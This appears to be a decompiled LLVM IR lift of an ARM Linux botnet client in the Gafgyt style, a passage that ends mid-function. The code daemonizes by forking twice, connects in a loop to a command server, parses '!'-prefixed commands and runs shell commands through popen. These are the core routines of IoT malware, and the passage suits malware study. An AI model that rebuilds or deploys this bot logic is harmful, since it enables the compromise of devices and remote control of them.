dec_label_pc_12e00:                               ; preds = %entry
  br label %dec_label_pc_1305c

dec_label_pc_12e10:                               ; preds = %entry
  store i32 16, i32* @r2, align 4
  %v2_12e20 = bitcast i32* %stack_var_-52 to i8*
  %v3_12e20 = call i32 @__GI_memset(i8* %v2_12e20, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_23f4c.1262 to i32), i32* @r0, align 4
  %v2_12e38 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_23f4c.1262 to i32))
  %v1_12e48 = call i32 @__GI_htons(i32 53)
  %v3_12e6c = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_12e6c = call i32 @__libc_connect(i32 %v0_12de8, %sockaddr* %v3_12e6c, i32 16)
  %v3_12e7c = icmp eq i32 %v4_12e6c, -1
  br i1 %v3_12e7c, label %dec_label_pc_12e84, label %dec_label_pc_12e94

dec_label_pc_12e84:                               ; preds = %dec_label_pc_12e10
  br label %dec_label_pc_1305c

dec_label_pc_12e94:                               ; preds = %dec_label_pc_12e10
  store i32 16, i32* %stack_var_-72, align 4
  %v2_12e9c = ptrtoint i32* %stack_var_-68 to i32
  %v2_12ea0 = ptrtoint i32* %stack_var_-72 to i32
  %v5_12eac = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_12eac = call i32 @__GI_getsockname(i32 %v0_12de8, %sockaddr* %v5_12eac, i32 %v2_12ea0, i32 %v2_12e9c, i32 16)
  %v3_12ebc = icmp eq i32 %v6_12eac, -1
  br i1 %v3_12ebc, label %dec_label_pc_12ec4, label %dec_label_pc_12ed4

dec_label_pc_12ec4:                               ; preds = %dec_label_pc_12e94
  br label %dec_label_pc_1305c

dec_label_pc_12ed4:                               ; preds = %dec_label_pc_12e94
  store i32 %tmp20, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_346b4.479 to i32), i32* @r2, align 4
  store i32 %tmp20, i32* @global_var_346b4.479, align 4
  %v4_12ee8 = call i32 @__GI_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_23f54.1265, i32 0, i32 0), i32 0)
  %v2_12f80 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_12f78

dec_label_pc_12ef8:                               ; preds = %dec_label_pc_12f78
  %v4_12f0c = call i32 @strstr(i32 %v2_12f80, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_23f64.1267, i32 0, i32 0))
  %v2_12f14 = icmp eq i32 %v4_12f0c, 0
  br i1 %v2_12f14, label %dec_label_pc_12f5c, label %dec_label_pc_12f3c.preheader

dec_label_pc_12f3c.preheader:                     ; preds = %dec_label_pc_12ef8
  %v2_12f409 = load i8, i8* %stack_var_-4168, align 1
  %v7_12f4413 = icmp eq i8 %v2_12f409, 9
  br i1 %v7_12f4413, label %dec_label_pc_12f4c, label %dec_label_pc_12f30

dec_label_pc_12f30:                               ; preds = %dec_label_pc_12f3c.preheader, %dec_label_pc_12f30
  %v4_12f3c14 = phi i32 [ %v1_12f34, %dec_label_pc_12f30 ], [ %v2_12f80, %dec_label_pc_12f3c.preheader ]
  %v1_12f34 = add i32 %v4_12f3c14, 1
  %v5_12f38 = inttoptr i32 %v1_12f34 to i8*
  %v2_12f40 = load i8, i8* %v5_12f38, align 1
  %v7_12f44 = icmp eq i8 %v2_12f40, 9
  br i1 %v7_12f44, label %dec_label_pc_12f4c, label %dec_label_pc_12f30

dec_label_pc_12f4c:                               ; preds = %dec_label_pc_12f30, %dec_label_pc_12f3c.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_12f3c.preheader ], [ %v5_12f38, %dec_label_pc_12f30 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_12fa0

dec_label_pc_12f5c:                               ; preds = %dec_label_pc_12ef8
  store i32 4096, i32* @r2, align 4
  %v3_12f74 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_12f78

dec_label_pc_12f78:                               ; preds = %dec_label_pc_12ed4, %dec_label_pc_12f5c
  %v4_12f90 = call i32 @fdgets(i32 %v2_12f80, i32 4096, i32 %v4_12ee8, i32 %v2_12f80)
  %v2_12f98 = icmp eq i32 %v4_12f90, 0
  br i1 %v2_12f98, label %dec_label_pc_12fa0, label %dec_label_pc_12ef8

dec_label_pc_12fa0:                               ; preds = %dec_label_pc_12f78, %dec_label_pc_12f4c
  %v1_12fa4 = call i32 @__GI_close(i32 %v4_12ee8)
  %v4_12fb4 = load i8, i8* %stack_var_-4168, align 1
  %v2_12fb8 = icmp eq i8 %v4_12fb4, 0
  br i1 %v2_12fb8, label %dec_label_pc_13050, label %dec_label_pc_12fc0

dec_label_pc_12fc0:                               ; preds = %dec_label_pc_12fa0
  %v2_12fc8 = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_12f80, i32* @r1, align 4
  %v2_12fe0 = bitcast i32* %stack_var_-4200 to i8*
  %v3_12fe0 = call i32 @strcpy(i8* %v2_12fe0, i32 %v2_12f80)
  %v3_13000 = call i32 @ioctl(i32 %v0_12de8, i32 35111, i32 %v2_12fc8)
  %v2_13020 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_13010

dec_label_pc_13010:                               ; preds = %dec_label_pc_12fc0, %dec_label_pc_13010
  %storemerge47 = phi i32 [ 0, %dec_label_pc_12fc0 ], [ %v1_1303c, %dec_label_pc_13010 ]
  %v2_13028 = add i32 %storemerge47, %v2_13020
  %v1_1302c = inttoptr i32 %v2_13028 to i8*
  %v2_1302c = load i8, i8* %v1_1302c, align 1
  %v4_13034 = add i32 %storemerge47, ptrtoint (i32* @global_var_2e468.1269 to i32)
  %v5_13034 = inttoptr i32 %v4_13034 to i8*
  store i8 %v2_1302c, i8* %v5_13034, align 1
  %v1_1303c = add nuw nsw i32 %storemerge47, 1
  %v7_1304c = icmp slt i32 %v1_1303c, 6
  br i1 %v7_1304c, label %dec_label_pc_13010, label %dec_label_pc_13050

dec_label_pc_13050:                               ; preds = %dec_label_pc_13010, %dec_label_pc_12fa0
  %v1_13054 = call i32 @__GI_close(i32 %v0_12de8)
  %v3_13070.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_1306c

dec_label_pc_1305c:                               ; preds = %dec_label_pc_12ec4, %dec_label_pc_12e84, %dec_label_pc_12e00
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_1306c

dec_label_pc_1306c:                               ; preds = %dec_label_pc_13050, %dec_label_pc_1305c
  %v3_13070 = phi i32 [ %v3_13070.pre, %dec_label_pc_13050 ], [ 0, %dec_label_pc_1305c ]
  %v2_13078 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13078, i32* @fp, align 4
  ret i32 %v3_13070

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_12f34, { 1, 0 }
  uselistorder i32 %v2_12f80, { 2, 1, 3, 5, 0, 4 }
  uselistorder i32 %v0_12de8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_htons, { 14, 13, 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 15, 3, 2, 1 }
  uselistorder i32 (i32)* @inet_addr, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1306c, { 1, 0 }
  uselistorder label %dec_label_pc_13010, { 1, 0 }
  uselistorder label %dec_label_pc_12f78, { 1, 0 }
  uselistorder label %dec_label_pc_12f30, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v0_130a8 = call i32 @access()
  %v7_130b0 = icmp eq i32 %v0_130a8, -1
  %v4_130cc = select i1 %v7_130b0, i32 ptrtoint ([7 x i8]* @global_var_23f88.1275 to i32), i32 ptrtoint ([7 x i8]* @global_var_23f80.1273 to i32)
  ret i32 %v4_130cc
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_130e8 = load i32, i32* @r4, align 4
  store i32 %v3_130e8, i32* %stack_var_-24, align 4
  store i32 78064, i32* %stack_var_-4, align 4
  %v19_130e8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_130ec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_130ec, i32* @fp, align 4
  %v0_13128 = call i32 @access()
  store i32 %v0_13128, i32* @r0, align 4
  %v7_13130 = icmp eq i32 %v0_13128, -1
  %. = select i1 %v7_13130, i32 ptrtoint ([19 x i8]* @global_var_23f9c.1282 to i32), i32 ptrtoint ([5 x i8]* @global_var_23f94.1280 to i32)
  %v0_1314c = call i32 @geteuid()
  %v2_13154 = icmp eq i32 %v0_1314c, 0
  br i1 %v2_13154, label %dec_label_pc_1315c, label %dec_label_pc_13168

dec_label_pc_1315c:                               ; preds = %entry
  store i32 0, i32* @global_var_2e158.1284, align 4
  br label %dec_label_pc_13168

dec_label_pc_13168:                               ; preds = %entry, %dec_label_pc_1315c
  %v0_13168 = call i32 @getBuild()
  %v0_13174 = call i32 @getBuild()
  store i32 %v0_13174, i32* @r4, align 4
  %v2_13180 = load i32, i32* @global_var_346b4.479, align 4
  store i32 %v2_13180, i32* @r0, align 4
  %v1_13184 = call i32 @__GI_inet_ntoa(i32 %v2_13180)
  %v0_13190 = load i32, i32* @r4, align 4
  %v1_13190 = inttoptr i32 %v0_13190 to i8*
  %v1_13194 = inttoptr i32 %v1_13184 to i8*
  %v9_13198 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_23fb0.1287, i32 0, i32 0), i8* %v1_13190, i8* %v1_13194)
  %v1_131ac = bitcast i8** %argv to i32*
  %v2_131ac = load i32, i32* %v1_131ac, align 4
  store i32 %v2_131ac, i32* @r4, align 4
  %v2_131c4 = load i32, i32* %v1_131ac, align 4
  %v1_131c8 = inttoptr i32 %v2_131c4 to i8*
  %v3_131cc = call i32 @strlen(i8* %v1_131c8)
  %v0_131d4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_23f90.1277 to i32), i32* @r1, align 4
  %v3_131e0 = call i32 @strncpy(i32 %v0_131d4, i32 ptrtoint (i32* @global_var_23f90.1277 to i32), i32 %v3_131cc)
  %v2_131f4 = load i32, i32* %v1_131ac, align 4
  store i32 %v2_131f4, i32* @r0, align 4
  %v2_13200 = call i32 @sprintf(i32 %v2_131f4, i32 %.)
  %v0_13224 = call i32 @prctl()
  %v2_1322c = call i32 @time(i32* null)
  store i32 %v2_1322c, i32* @r4, align 4
  %v0_13234 = call i32 @getpid()
  %v0_1323c = load i32, i32* @r4, align 4
  %v2_1323c = xor i32 %v0_1323c, %v0_13234
  %v1_13244 = call i32 @srand(i32 %v2_1323c)
  %v2_1324c = call i32 @time(i32* null)
  store i32 %v2_1324c, i32* @r4, align 4
  %v0_13254 = call i32 @getpid()
  %v0_1325c = load i32, i32* @r4, align 4
  %v2_1325c = xor i32 %v0_1325c, %v0_13254
  %v1_13264 = call i32 @init_rand(i32 %v2_1325c)
  %v1_13268 = call i32 @getOurIP(i32 %v1_13264)
  %v0_1326c = call i32 @__libc_fork()
  %v2_1327c = icmp eq i32 %v0_1326c, 0
  br i1 %v2_1327c, label %dec_label_pc_132ac, label %dec_label_pc_132a0

dec_label_pc_132a0:                               ; preds = %dec_label_pc_13168
  %v2_13284 = ptrtoint i32* %stack_var_-92 to i32
  %v3_13294 = call i32 @__libc_waitpid(i32 %v0_1326c, i32 %v2_13284, i32 0)
  %v1_1329c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_132cc

dec_label_pc_132ac:                               ; preds = %dec_label_pc_13168
  %v0_132ac = call i32 @__libc_fork()
  %v2_132bc = icmp eq i32 %v0_132ac, 0
  br i1 %v2_132bc, label %dec_label_pc_132cc, label %dec_label_pc_132c4

dec_label_pc_132c4:                               ; preds = %dec_label_pc_132ac
  %v1_132c8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_132cc

dec_label_pc_132cc:                               ; preds = %dec_label_pc_132a0, %dec_label_pc_132ac, %dec_label_pc_132c4
  %v0_132cc = call i32 @__GI_setsid()
  %v0_132d4 = call i32 @chdir()
  %v2_132e0 = call i32 @bsd_signal(i32 13, i32 1)
  %v2_13b24 = ptrtoint i32* %stack_var_-5252 to i32
  %v4_13b34 = bitcast i32* %stack_var_-5252 to i8*
  %v1_13760 = or i32 %v2_13b24, 1
  %v5_13764 = inttoptr i32 %v1_13760 to i8*
  %v2_138c4 = ptrtoint i32* %stack_var_-1156 to i32
  %v2_138d4 = bitcast i32* %stack_var_-1156 to i8*
  %v2_13ab0 = bitcast i8** %stack_var_-132 to i32*
  %v2_13ae4 = add i32 %v19_130e8, -108
  br label %dec_label_pc_132e4

dec_label_pc_132e4:                               ; preds = %dec_label_pc_132f4, %dec_label_pc_13b14, %dec_label_pc_132cc
  %v0_132e4 = call i32 @initConnection()
  %v2_132ec = icmp eq i32 %v0_132e4, 0
  br i1 %v2_132ec, label %dec_label_pc_13300, label %dec_label_pc_132f4

dec_label_pc_132f4:                               ; preds = %dec_label_pc_132e4
  %v1_132f8 = call i32 @sleep(i32 5)
  br label %dec_label_pc_132e4

dec_label_pc_13300:                               ; preds = %dec_label_pc_132e4
  %v2_13304 = load i32, i32* @global_var_2e45c.55, align 4
  store i32 %v2_13304, i32* @r4, align 4
  %v2_1330c = load i32, i32* @global_var_346b4.479, align 4
  store i32 %v2_1330c, i32* @r0, align 4
  %v1_13310 = call i32 @__GI_inet_ntoa(i32 %v2_1330c)
  store i32 %v1_13310, i32* @r5, align 4
  %v0_13318 = call i32 @getBuild()
  %v0_13328 = load i32, i32* @r4, align 4
  %v0_13330 = load i32, i32* @r5, align 4
  store i32 %v0_13330, i32* @r2, align 4
  %v2_13338 = call i32 @HackerPrint(i32 %v0_13328, i32 ptrtoint (i32* @global_var_23fc4.1294 to i32))
  br label %dec_label_pc_13b14

dec_label_pc_1335c:                               ; preds = %dec_label_pc_13618, %dec_label_pc_135bc
  %v3_13360 = mul i32 %storemerge16, 4
  %v2_1336c = load i32, i32* @global_var_346c0.64, align 4
  %v2_13370 = add i32 %v2_1336c, %v3_13360
  %v1_13374 = inttoptr i32 %v2_13370 to i32*
  %v2_13374 = load i32, i32* %v1_13374, align 4
  %v3_13384 = call i32 @__libc_waitpid(i32 %v2_13374, i32 0, i32 1)
  %tmp94 = icmp slt i32 %v3_13384, 1
  br i1 %tmp94, label %dec_label_pc_135b0, label %dec_label_pc_133e8

dec_label_pc_133a4:                               ; preds = %dec_label_pc_133e8, %dec_label_pc_1342c
  %v2_133a8 = load i32, i32* @global_var_346c0.64, align 4
  %v3_133b4 = mul i32 %v1_13398, 4
  %v1_133ac = add i32 %v3_133b4, -4
  %v2_133b8 = add i32 %v1_133ac, %v2_133a8
  %v2_133d0 = add i32 %v2_133a8, %v3_133b4
  %v1_133d4 = inttoptr i32 %v2_133d0 to i32*
  %v2_133d4 = load i32, i32* %v1_133d4, align 4
  %v2_133d8 = inttoptr i32 %v2_133b8 to i32*
  store i32 %v2_133d4, i32* %v2_133d8, align 4
  br label %dec_label_pc_133e8

dec_label_pc_133e8:                               ; preds = %dec_label_pc_1335c, %dec_label_pc_133a4
  %v3_13394.sink = phi i32 [ %v1_13398, %dec_label_pc_133a4 ], [ %storemerge16, %dec_label_pc_1335c ]
  %v1_13398 = add i32 %v3_13394.sink, 1
  %v5_13404 = load i32, i32* @global_var_2e464.62, align 4
  %v9_13424 = icmp eq i32 %v5_13404, 0
  br i1 %v9_13424, label %dec_label_pc_1342c, label %dec_label_pc_133a4

dec_label_pc_1342c:                               ; preds = %dec_label_pc_133e8
  %v2_13404 = load i32, i32* @global_var_2e460.61, align 4
  %tmp95 = icmp ugt i32 %v2_13404, %v1_13398
  br i1 %tmp95, label %dec_label_pc_133a4, label %dec_label_pc_1345c

dec_label_pc_1345c:                               ; preds = %dec_label_pc_1342c
  %v2_13460 = load i32, i32* @global_var_346c0.64, align 4
  %v3_1346c = mul i32 %v1_13398, 4
  %v1_13464 = add i32 %v3_1346c, -4
  %v2_13470 = add i32 %v1_13464, %v2_13460
  %v2_13478 = inttoptr i32 %v2_13470 to i32*
  store i32 0, i32* %v2_13478, align 4
  %v2_13480 = load i32, i32* @global_var_2e460.61, align 4
  %v5_13480 = load i32, i32* @global_var_2e464.62, align 4
  %v2_1348c = add i32 %v2_13480, -1
  %v3_1348c = icmp ne i32 %v2_13480, 0
  %v3_13490 = add i32 %v5_13480, -1
  %v4_13490 = zext i1 %v3_1348c to i32
  %v5_13490 = add i32 %v3_13490, %v4_13490
  store i32 %v2_1348c, i32* @global_var_2e460.61, align 4
  store i32 %v5_13490, i32* @global_var_2e464.62, align 4
  %v3_134ac = icmp eq i32 %v2_13480, 0
  %v4_134b0 = zext i1 %v3_134ac to i32
  %v5_134b0 = add i32 %v5_13490, %v4_134b0
  %v3_134b4 = udiv i32 %v2_13480, 1073741824
  %v3_134b8 = mul i32 %v5_134b0, 4
  %v2_134bc = or i32 %v3_134b8, %v3_134b4
  store i32 %v2_134bc, i32* @r4, align 4
  %v3_134c0 = mul i32 %v2_13480, 4
  %v1_134c8 = call i32 @malloc(i32 %v3_134c0)
  br label %dec_label_pc_13520

dec_label_pc_134e0:                               ; preds = %dec_label_pc_13520, %dec_label_pc_13564
  %v3_134e4 = mul i32 %storemerge20, 4
  %v2_134f0 = add i32 %v3_134e4, %v1_134c8
  %v2_13504 = load i32, i32* @global_var_346c0.64, align 4
  %v2_13508 = add i32 %v2_13504, %v3_134e4
  %v1_1350c = inttoptr i32 %v2_13508 to i32*
  %v2_1350c = load i32, i32* %v1_1350c, align 4
  %v2_13510 = inttoptr i32 %v2_134f0 to i32*
  store i32 %v2_1350c, i32* %v2_13510, align 4
  %v1_13518 = add i32 %storemerge20, 1
  br label %dec_label_pc_13520

dec_label_pc_13520:                               ; preds = %dec_label_pc_1345c, %dec_label_pc_134e0
  %storemerge20 = phi i32 [ 0, %dec_label_pc_1345c ], [ %v1_13518, %dec_label_pc_134e0 ]
  %v5_1353c = load i32, i32* @global_var_2e464.62, align 4
  %v9_1355c = icmp eq i32 %v5_1353c, 0
  br i1 %v9_1355c, label %dec_label_pc_13564, label %dec_label_pc_134e0

dec_label_pc_13564:                               ; preds = %dec_label_pc_13520
  %v2_1353c = load i32, i32* @global_var_2e460.61, align 4
  %tmp = icmp ugt i32 %v2_1353c, %storemerge20
  br i1 %tmp, label %dec_label_pc_134e0, label %dec_label_pc_13594

dec_label_pc_13594:                               ; preds = %dec_label_pc_13564
  %v2_13598 = load i32, i32* @global_var_346c0.64, align 4
  store i32 %v2_13598, i32* @r0, align 4
  %v0_135a0 = call i32 @free()
  store i32 %v1_134c8, i32* @global_var_346c0.64, align 4
  br label %dec_label_pc_135b0

dec_label_pc_135b0:                               ; preds = %dec_label_pc_1335c, %dec_label_pc_13594
  %v1_135b4 = add i32 %storemerge16, 1
  br label %dec_label_pc_135bc

dec_label_pc_135bc:                               ; preds = %dec_label_pc_13b14, %dec_label_pc_135b0
  %storemerge16 = phi i32 [ %v1_135b4, %dec_label_pc_135b0 ], [ 0, %dec_label_pc_13b14 ]
  %v3_135c4 = ashr i32 %storemerge16, 31
  %v2_135d8 = load i32, i32* @global_var_2e460.61, align 4
  %v5_135d8 = load i32, i32* @global_var_2e464.62, align 4
  %v3_135f8 = icmp uge i32 %v5_135d8, %v3_135c4
  %v9_135f8 = icmp eq i32 %v5_135d8, %v3_135c4
  %v2_135fc = xor i1 %v9_135f8, true
  %v3_135fc = and i1 %v3_135f8, %v2_135fc
  br i1 %v3_135fc, label %dec_label_pc_1335c, label %dec_label_pc_13600

dec_label_pc_13600:                               ; preds = %dec_label_pc_135bc
  br i1 %v9_135f8, label %dec_label_pc_13618, label %dec_label_pc_13630

dec_label_pc_13618:                               ; preds = %dec_label_pc_13600
  %tmp109 = icmp ugt i32 %v2_135d8, %storemerge16
  br i1 %tmp109, label %dec_label_pc_1335c, label %dec_label_pc_13630

dec_label_pc_13630:                               ; preds = %dec_label_pc_13600, %dec_label_pc_13618
  %v2_13644 = add i32 %v5_13b34, %v2_13b24
  %v3_1364c = inttoptr i32 %v2_13644 to i8*
  store i8 0, i8* %v3_1364c, align 1
  %v2_13660 = call i32 @trim(i8* %v4_13b34)
  %v4_13678 = call i32 @strstr(i32 %v2_13b24, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f934.57, i32 0, i32 0))
  store i32 %v4_13678, i32* @r2, align 4
  %v9_1368c = icmp eq i32 %v4_13678, %v2_13b24
  br i1 %v9_1368c, label %dec_label_pc_13694, label %dec_label_pc_136ac

dec_label_pc_13694:                               ; preds = %dec_label_pc_13630
  %v2_13698 = load i32, i32* @global_var_2e45c.55, align 4
  %v3_136a4 = call i32 @HackerPrint(i32 %v2_13698, i32 ptrtoint ([5 x i8]* @global_var_2404c.1299 to i32))
  br label %dec_label_pc_13b14

dec_label_pc_136ac:                               ; preds = %dec_label_pc_13630
  %v6_136c0 = call i32 @strstr(i32 %v2_13b24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_24054.1301, i32 0, i32 0))
  %v9_136d4 = icmp eq i32 %v6_136c0, %v2_13b24
  br i1 %v9_136d4, label %dec_label_pc_136dc, label %dec_label_pc_136e4

dec_label_pc_136dc:                               ; preds = %dec_label_pc_136ac
  %v1_136e0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_136e4

dec_label_pc_136e4:                               ; preds = %dec_label_pc_136ac, %dec_label_pc_136dc
  %v2_136f8 = load i8, i8* %v4_13b34, align 4
  %v7_136fc = icmp eq i8 %v2_136f8, 33
  br i1 %v7_136fc, label %dec_label_pc_13720, label %dec_label_pc_13b14

dec_label_pc_13720:                               ; preds = %dec_label_pc_136e4, %dec_label_pc_13730
  %v3_13704.sink = phi i8* [ %storemerge10, %dec_label_pc_13730 ], [ %v4_13b34, %dec_label_pc_136e4 ]
  %v4_13704 = ptrtoint i8* %v3_13704.sink to i32
  %v1_13708 = add i32 %v4_13704, 1
  %storemerge10 = inttoptr i32 %v1_13708 to i8*
  %v2_13724 = load i8, i8* %storemerge10, align 1
  %v7_13728 = icmp eq i8 %v2_13724, 32
  br i1 %v7_13728, label %dec_label_pc_13740, label %dec_label_pc_13730

dec_label_pc_13730:                               ; preds = %dec_label_pc_13720
  %v2_13734 = load i8, i8* %storemerge10, align 1
  %v2_13738 = icmp eq i8 %v2_13734, 0
  br i1 %v2_13738, label %dec_label_pc_13740, label %dec_label_pc_13720

dec_label_pc_13740:                               ; preds = %dec_label_pc_13730, %dec_label_pc_13720
  %v2_13744 = load i8, i8* %storemerge10, align 1
  %v2_13748 = icmp eq i8 %v2_13744, 0
  br i1 %v2_13748, label %dec_label_pc_13b14, label %dec_label_pc_13750

dec_label_pc_13750:                               ; preds = %dec_label_pc_13740
  store i8 0, i8* %storemerge10, align 1
  %v3_13770 = call i32 @strlen(i8* %v5_13764)
  %v2_13780 = add i32 %v3_13770, %v2_13b24
  %v1_13784 = add i32 %v2_13780, 2
  %v5_13788 = inttoptr i32 %v1_13784 to i8*
  %v1_137b8 = add i32 %v2_13780, 1
  br label %dec_label_pc_137b4

dec_label_pc_13790:                               ; preds = %dec_label_pc_137dc, %dec_label_pc_137b4
  %v3_137a0 = call i32 @strlen(i8* %v5_13788)
  %v2_137a8 = add i32 %v1_137b8, %v3_137a0
  %v3_137b0 = inttoptr i32 %v2_137a8 to i8*
  store i8 0, i8* %v3_137b0, align 1
  br label %dec_label_pc_137b4

dec_label_pc_137b4:                               ; preds = %dec_label_pc_13750, %dec_label_pc_13790
  %v3_137c4 = call i32 @strlen(i8* %v5_13788)
  %v2_137cc = add i32 %v1_137b8, %v3_137c4
  %v1_137d0 = inttoptr i32 %v2_137cc to i8*
  %v2_137d0 = load i8, i8* %v1_137d0, align 1
  %v7_137d4 = icmp eq i8 %v2_137d0, 10
  br i1 %v7_137d4, label %dec_label_pc_13790, label %dec_label_pc_137dc

dec_label_pc_137dc:                               ; preds = %dec_label_pc_137b4
  store i32 %v1_137b8, i32* @r4, align 4
  %v3_137ec = call i32 @strlen(i8* %v5_13788)
  %v0_137f4 = load i32, i32* @r4, align 4
  %v2_137f4 = add i32 %v0_137f4, %v3_137ec
  %v1_137f8 = inttoptr i32 %v2_137f4 to i8*
  %v2_137f8 = load i8, i8* %v1_137f8, align 1
  %v7_137fc = icmp eq i8 %v2_137f8, 13
  br i1 %v7_137fc, label %dec_label_pc_13790, label %dec_label_pc_13804

dec_label_pc_13804:                               ; preds = %dec_label_pc_137dc
  %v2_1382022 = load i8, i8* %v5_13788, align 1
  %v7_1382426 = icmp eq i8 %v2_1382022, 32
  br i1 %v7_1382426, label %dec_label_pc_1383c, label %dec_label_pc_1382c

dec_label_pc_13810:                               ; preds = %dec_label_pc_1382c
  %v1_13814 = add i32 %v4_1381c28, 1
  %v5_13818 = inttoptr i32 %v1_13814 to i8*
  %v2_13820 = load i8, i8* %v5_13818, align 1
  %v7_13824 = icmp eq i8 %v2_13820, 32
  br i1 %v7_13824, label %dec_label_pc_1383c, label %dec_label_pc_1382c

dec_label_pc_1382c:                               ; preds = %dec_label_pc_13804, %dec_label_pc_13810
  %v4_1381c28 = phi i32 [ %v1_13814, %dec_label_pc_13810 ], [ %v1_13784, %dec_label_pc_13804 ]
  %stack_var_-64.027 = phi i8* [ %v5_13818, %dec_label_pc_13810 ], [ %v5_13788, %dec_label_pc_13804 ]
  %v2_13830 = load i8, i8* %stack_var_-64.027, align 1
  %v2_13834 = icmp eq i8 %v2_13830, 0
  br i1 %v2_13834, label %dec_label_pc_1383c, label %dec_label_pc_13810

dec_label_pc_1383c:                               ; preds = %dec_label_pc_13810, %dec_label_pc_1382c, %dec_label_pc_13804
  %stack_var_-64.0.lcssa = phi i8* [ %v5_13788, %dec_label_pc_13804 ], [ %v5_13818, %dec_label_pc_13810 ], [ %stack_var_-64.027, %dec_label_pc_1382c ]
  %v4_1381c.lcssa = phi i32 [ %v1_13784, %dec_label_pc_13804 ], [ %v1_13814, %dec_label_pc_13810 ], [ %v4_1381c28, %dec_label_pc_1382c ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_1384c = add i32 %v4_1381c.lcssa, 1
  %v2_1389033 = load i8, i8* %v5_13788, align 1
  %v2_1389435 = icmp eq i8 %v2_1389033, 0
  br i1 %v2_1389435, label %dec_label_pc_1389c, label %dec_label_pc_13860

dec_label_pc_13860:                               ; preds = %dec_label_pc_1383c, %dec_label_pc_13860
  %v4_1388c37 = phi i32 [ %v1_13884, %dec_label_pc_13860 ], [ %v1_13784, %dec_label_pc_1383c ]
  %storemerge936 = phi i8* [ %v5_13888, %dec_label_pc_13860 ], [ %v5_13788, %dec_label_pc_1383c ]
  %v2_13864 = load i8, i8* %storemerge936, align 1
  %v3_13864 = zext i8 %v2_13864 to i32
  %v1_1386c = call i32 @__GI_toupper(i32 %v3_13864)
  %v1_1387c = trunc i32 %v1_1386c to i8
  store i8 %v1_1387c, i8* %storemerge936, align 1
  %v1_13884 = add i32 %v4_1388c37, 1
  %v5_13888 = inttoptr i32 %v1_13884 to i8*
  %v2_13890 = load i8, i8* %v5_13888, align 1
  %v2_13894 = icmp eq i8 %v2_13890, 0
  br i1 %v2_13894, label %dec_label_pc_1389c, label %dec_label_pc_13860

dec_label_pc_1389c:                               ; preds = %dec_label_pc_13860, %dec_label_pc_1383c
  %v2_138a0 = load i8, i8* %v5_13788, align 1
  %v2_138a4 = icmp eq i8 %v2_138a0, 0
  br i1 %v2_138a4, label %dec_label_pc_138ac, label %dec_label_pc_13990

dec_label_pc_138ac:                               ; preds = %dec_label_pc_1389c
  %v0_138ac = call i32 @listFork()
  %v2_138b4 = icmp eq i32 %v0_138ac, 0
  br i1 %v2_138b4, label %dec_label_pc_138bc, label %dec_label_pc_13b14

dec_label_pc_138bc:                               ; preds = %dec_label_pc_138ac
  store i32 1024, i32* @r2, align 4
  %v3_138d4 = call i32 @__GI_memset(i8* %v2_138d4, i32 0)
  %v6_138f4 = call i32 @szprintf(i32 %v2_138c4, i32 ptrtoint ([8 x i8]* @global_var_24058.1303 to i32), i32 %v1_1384c, i32 %v2_138c4, i32 ptrtoint (i32* @0 to i32))
  %v3_13910 = call i32 @fdpopen(i32 %v2_138c4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_24060.1305, i32 0, i32 0))
  br label %dec_label_pc_13958

dec_label_pc_13920:                               ; preds = %dec_label_pc_13958
  %v2_13930 = call i32 @trim(i8* %v2_138d4)
  store i32 1024, i32* @r2, align 4
  %v3_1394c = call i32 @__GI_memset(i8* %v2_138d4, i32 0)
  %v1_13954 = call i32 @sleep(i32 1)
  br label %dec_label_pc_13958

dec_label_pc_13958:                               ; preds = %dec_label_pc_138bc, %dec_label_pc_13920
  %v4_13970 = call i32 @fdgets(i32 %v2_138c4, i32 1024, i32 %v3_13910, i32 %v2_138c4)
  %v2_13978 = icmp eq i32 %v4_13970, 0
  br i1 %v2_13978, label %dec_label_pc_13980, label %dec_label_pc_13920

